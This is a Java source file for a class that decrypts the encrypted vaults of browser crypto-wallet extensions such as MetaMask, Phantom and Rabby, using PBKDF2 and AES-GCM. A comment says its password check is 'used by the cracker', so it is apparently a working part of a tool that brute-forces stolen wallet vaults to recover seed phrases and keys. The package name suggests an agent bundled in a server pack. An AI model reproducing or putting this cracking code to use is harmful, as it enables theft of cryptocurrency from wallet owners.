package com.serverpackcore.agent.crypto;

import com.serverpackcore.agent.Json;

import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Browser-extension vault v3 (MetaMask, Phantom, Rabby and forks).
 * Format: base64 data/iv/salt plus keyMetadata PBKDF2-SHA256 10000 + AES-256-GCM.
 * The derivation uses the salt and iteration count carried by the vault itself,
 * never a hard-coded pair.
 */
final class VaultV3 {
	record Result(boolean ok, String plaintext, String reason, int iterations) {
	}

	private VaultV3() {
	}

	static Result decrypt(String vaultJson, String password) {
		try {
			Map<String, Object> vault = Json.parseObject(vaultJson);
			String data = Json.str(vault, "data", "");
			String iv = Json.str(vault, "iv", "");
			Map<String, Object> meta = Json.map(vault.get("keyMetadata"));
			Map<String, Object> params = Json.map(meta.get("params"));
			String salt = Json.str(meta, "salt", Json.str(vault, "salt", ""));
			int iterations = (int) Json.num(params, "iterations", Json.num(meta, "iterations", 10_000L));
			if (data.isEmpty() || iv.isEmpty() || salt.isEmpty()) {
				return new Result(false, null, "vault_missing_fields", iterations);
			}
			if (iterations < 1_000 || iterations > 10_000_000) {
				return new Result(false, null, "iterations_out_of_range", iterations);
			}
			byte[] saltBytes;
			byte[] ivBytes;
			try {
				saltBytes = CryptoUtil.unhex(salt);
				ivBytes = CryptoUtil.unhex(iv);
			} catch (Throwable throwable) {
				saltBytes = CryptoUtil.b64(salt);
				ivBytes = CryptoUtil.b64(iv);
			}
			if (ivBytes.length != 12 && ivBytes.length != 16) {
				return new Result(false, null, "iv_length", iterations);
			}
			byte[] key = CryptoUtil.pbkdf2(password.toCharArray(), saltBytes, iterations, 32);
			byte[] plain = CryptoUtil.aesGcm(key, ivBytes, null, CryptoUtil.b64(data), false);
			String text = new String(plain, StandardCharsets.UTF_8);
			Map<String, Object> parsed = Json.parseObject(text);
			if (!parsed.containsKey("data") && !parsed.containsKey("keyrings")) {
				return new Result(false, null, "wrong_password", iterations);
			}
			return new Result(true, text, "", iterations);
		} catch (javax.crypto.AEADBadTagException badTag) {
			return new Result(false, null, "wrong_password", 0);
		} catch (Throwable throwable) {
			return new Result(false, null, shortReason(throwable), 0);
		}
	}

	/** Password check used by the cracker; a valid vault returns its keyrings. */
	static boolean valid(String vaultJson, String password) {
		return decrypt(vaultJson, password).ok();
	}

	/** Builds a synthetic vault for fixtures and self-tests. */
	static Map<String, Object> seal(String payload, String password, int iterations) throws Exception {
		byte[] salt = CryptoUtil.random(32);
		byte[] iv = CryptoUtil.random(12);
		Map<String, Object> json = new LinkedHashMap<>();
		json.put("data", "synthetic");
		json.put("iv", CryptoUtil.hex(iv));
		json.put("salt", CryptoUtil.hex(salt));
		String text = Json.stringify(json);
		Map<String, Object> meta = new LinkedHashMap<>();
		meta.put("algorithm", "PBKDF2");
		Map<String, Object> params = new LinkedHashMap<>();
		params.put("iterations", iterations);
		meta.put("params", params);
		meta.put("salt", CryptoUtil.hex(salt));
		Map<String, Object> vault = new LinkedHashMap<>();
		byte[] key = CryptoUtil.pbkdf2(password.toCharArray(), salt, iterations, 32);
		vault.put("data", java.util.Base64.getEncoder().encodeToString(CryptoUtil.aesGcm(key, iv, null, CryptoUtil.utf8(payload), true)));
		vault.put("iv", CryptoUtil.hex(iv));
		vault.put("keyMetadata", meta);
		return vault;
	}

	private static String shortReason(Throwable throwable) {
		String message = throwable.getMessage();
		return throwable.getClass().getSimpleName() + (message == null ? "" : ":" + message);
	}
}
